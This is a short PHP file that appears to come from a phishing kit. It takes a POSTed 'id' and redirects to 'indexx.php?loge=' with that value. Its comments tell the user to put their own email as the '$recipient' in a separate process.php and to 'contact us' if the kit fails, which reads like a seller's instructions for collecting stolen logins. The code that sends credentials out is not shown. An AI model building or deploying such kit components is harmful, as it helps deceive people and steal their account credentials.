<?php
// DONT CHANGE ANYTHING HERE JUST CHANGE YOUR EMAIL FROM folder ( look >> validator >> process.php >> $recipient
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
session_start();

$id = $_POST['id'];


header("location: indexx.php?loge=" . $id);

?>